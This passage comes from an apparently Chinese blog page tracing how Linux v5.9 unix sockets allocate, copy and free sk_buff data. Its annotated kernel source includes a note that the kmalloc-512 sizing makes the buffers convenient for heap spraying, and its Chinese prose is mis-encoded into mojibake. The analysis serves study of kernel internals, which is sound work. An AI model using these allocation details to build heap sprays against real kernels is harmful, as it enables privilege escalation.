class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------åˆ†å‰äºŒ:æ•°æ®å¤åˆ¶éƒ¨åˆ†</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-å†…å­˜ç”³è¯·"   >
          <a href="#A-å†…å­˜ç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <p>å…ˆè¿›è¡Œç›¸å…³å†…å­˜ç”³è¯·ï¼Œå³<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>è¿˜æ˜¯æŒºé•¿çš„ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯æœ€åçš„<code>__alloc_skb</code>å‡½æ•°ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//ä»ä¸“é—¨çš„ç¼“å­˜æ± skbuff_fclone_cache/skbuff_head_cacheä¸­ç”³è¯·å†…å­˜</span></span><br><span class="line">    <span class="comment">//ä½œä¸ºå¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å…ˆå¯¹é½ï¼Œè¿™ä¸ªå’ŒL1_CACHE_BYTESæœ‰å…³,64ä½ç³»ç»Ÿå³å’Œ64(0x40)å¯¹é½,32ä½ç±»ä¼¼ï¼Œå…·ä½“çš„è¿˜æ˜¯æŸ¥ä¸€ä¸‹æœ€å¥½</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += å¯¹é½ä¹‹åçš„0x140</span></span><br><span class="line">    <span class="comment">//é‚£ä¹ˆsizeåªå¯èƒ½æ˜¯0x140+n*0x40,æœ€ä½ä¸º0x180,å±äºkmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è™½ç„¶æ˜¯kmalloc_reserveå‡½æ•°ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯kmallocå½¢å¼</span></span><br><span class="line">    <span class="comment">//è°ƒç”¨åˆ°`__kmalloc_node_track_caller`å‡½æ•°è¿›è¡Œåˆ†é…</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªdataå³ä¸ºæˆ‘ä»¬å®é™…çš„å­˜å‚¨æ•°æ®çš„åœ°æ–¹,ä¹Ÿæ˜¯ä»kmallocç”³è¯·å‡ºçš„å †å—</span></span><br><span class="line">    <span class="comment">//å¹¶ä¸”æ˜¯ä»å¯¹å¼€çš„å¼€å¤´ä½ç½®å¤„å¼€å§‹å­˜å‚¨,å®Œæˆå†…å­˜ç”³è¯·åè¿”å›unix_stream_sendmsgå‡½æ•°</span></span><br><span class="line">    <span class="comment">//åœ¨`skb_copy_datagram_from_iter`å‡½æ•°ä¸­æ•°æ®ä¼šè¢«å¤åˆ¶</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–å¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li><code>sk_buff</code>ä¸ºæ•°æ®çš„ç®¡ç†ç»“æ„ä»ä¸“é—¨çš„ç¼“å­˜æ± <code>skbuff_fclone_cache/skbuff_head_cache</code>ä¸­ç”³è¯·å†…å­˜ï¼Œæ²¡åŠæ³•è¿›è¡Œæ§åˆ¶</li>
<li><code>skb-&gt;data</code>ä¸ºå®é™…çš„æ•°æ®ç»“æ„<ul>
<li><code>size</code>ï¼š<code>0x140+n*0x40</code>(0x40çš„å€æ•°è¡¥é½)ã€‚å³å¦‚æœä¼ å…¥çš„æ•°æ®é•¿åº¦ä¸º0x3fï¼Œåˆ™nä¸º1ï¼Œä¼ å…¥æ•°æ®ä¸º0x41ï¼Œåˆ™nä¸º2ã€‚</li>
<li>å †å—ç”³è¯·ï¼šèµ°<code>kmalloc</code>è¿›è¡Œç”³è¯·ï¼Œæ¯”è¾ƒå¸¸è§çš„ç§ç±»ï¼Œæ–¹ä¾¿å †å–·ã€‚</li>
</ul>
</li>
<li>æ¯è°ƒç”¨<code>wirte</code>å‡½æ•°å†™å…¥ä¸€æ¬¡æ•°æ®ï¼Œéƒ½ä¼šèµ°ä¸€éæµç¨‹ï¼Œç”³è¯·æ–°çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>ï¼Œä¸åŒæ¶ˆæ¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶"   >
          <a href="#B-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>ç›¸å…³å†…å­˜ç”³è¯·å®Œæˆä¹‹åï¼Œå›åˆ°<code>unix_stream_sendmsg</code>å‡½æ•°ï¼Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶<code>skb_copy_datagram_from_iter</code>ï¼Œå³ä¸Šè¿°æåˆ°çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy æ˜¯çº¿æ€§æ•°æ®åŒºçš„å‰©ä½™ç©ºé—´å¤§å°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//æ‹·è´åˆ°ç”³è¯·çš„ä¿å­˜æ•°æ®çš„å †å—skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-3"   >
          <a href="#â‘¡é‡Šæ”¾-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-3" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>å½“ä»<code>socker</code>å¥—æ¥å­—ä¸­è¯»å–å‡ºæŸæ¡ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¯¥æ¡ä¿¡æ¯çš„ç›¸å…³å†…å­˜çš„é‡Šæ”¾ï¼Œå³è¯¥æ¡ä¿¡æ¯å¯¹åº”<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œå¦‚æœè¯¥æ¡ä¿¡æ¯æ²¡æœ‰è¢«è¯»å–å®Œæ¯•ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿè¯¥ä¿¡æ¯ç›¸å…³å†…å­˜çš„é‡Šæ”¾ã€‚</p>
<p>åœ¨<code>read</code>æ—¶è¿›è¡Œçš„å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„åœ¨<code>unix_stream_read_generic</code>å¤„å¼€å§‹åˆ†å‰ï¼Œä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸‹é¢æˆªå–é‡è¦éƒ¨åˆ†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:æ•°æ®å¤åˆ¶</span></span><br><span class="line">        <span class="comment">//recv_actorå‡½æ•°æŒ‡é’ˆæ˜¯åœ¨unix_stream_recvmsgå‡½æ•°ä¸­å®šä¹‰çš„stateå‡½æ•°è¡¨</span></span><br><span class="line">        <span class="comment">//è¯¥å‡½æ•°æŒ‡é’ˆå¯¹åº”unix_stream_read_actorå‡½æ•°,å³ä»è¿™å¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//ä¼ è¾“æ•°æ®å®Œæˆä¹‹å,skb-&gt;usersä»2æ”¹ä¸º1,è¡¨ç¤ºå·²ç»å¤åˆ¶å®Œæ•°æ®äº†,æ–¹ä¾¿åç»­åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">//æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//ä¿®æ”¹skbç±»å‹è½¬æ¢ä¹‹åå¯¹åº”çš„consumedå­—æ®µ,å…¶å®å°±æ˜¯skb-&gt;cbæŸä¸ªä½ç½®å¤„çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//ä¾æ®ä¸Šé¢çš„consumedå’Œlenæ¥åˆ¤æ–­æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜å‰©ä¸‹æ²¡æœ‰ä¼ è¾“çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//æœ‰(1)åˆ™break,æ— (0)åˆ™è¿›å…¥åç»­çš„å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------åˆ†å‰äºŒ:å†…å­˜é‡Šæ”¾</span></span><br><span class="line">            <span class="comment">//å†…å­˜é‡Šæ”¾å‰ç½®å·¥ä½œ</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//è¿›å…¥è¯¥å‡½æ•°,é€šè¿‡å¯¹äºskb-&gt;usersçš„åˆ¤æ–­ä¹‹å,è¿›å…¥å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æ•°æ®å¤åˆ¶"   >
          <a href="#A-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æ•°æ®å¤åˆ¶" class="headerlink" title="A.æ•°æ®å¤åˆ¶"></a>A.æ•°æ®å¤åˆ¶</h5>
      <p>ä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>æœ€ç»ˆè¿›å…¥<code>__skb_datagram_iter</code>ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªheaderæŒ‡çš„å°±æ˜¯æ•°æ®data,å¤§æ¦‚å°±æ˜¯ä»è¿™é‡Œå¼€å§‹å®é™…çš„æ•°æ®</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linuxå†…æ ¸ç»´æŠ¤äººå‘˜éƒ½çœ‹ä¸ä¸‹å»äº†,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œä½¿ç”¨äº†æ„Ÿè§‰å¾ˆå¤æ‚çš„æœºåˆ¶ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚</p>

        <h5 id="B-å†…å­˜é‡Šæ”¾"   >
          <a href="#B-å†…å­˜é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-å†…å­˜é‡Šæ”¾" class="headerlink" title="B.å†…å­˜é‡Šæ”¾"></a>B.å†…å­˜é‡Šæ”¾</h5>
      <p>è¿›å…¥å†…å­˜é‡Šæ”¾çš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<ul>
<li><p>é‡Šæ”¾<code>skb-&gt;data</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å…¶å®headå’Œdataæ˜¯ä¸€æ ·çš„</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ­£å¸¸çš„<code>kfree</code>å‡½æ•°</p>
</li>
<li><p>é‡Šæ”¾<code>skb</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//å…‹éš†ä½“ç›¸å…³çš„,æ²¡æœ‰forkä¹‹ç±»çš„è¯ä¸€èˆ¬ä¸ç”¨å¤ªç®¡çš„</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_head_cache)è¿›è¡Œå›æ”¶</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone 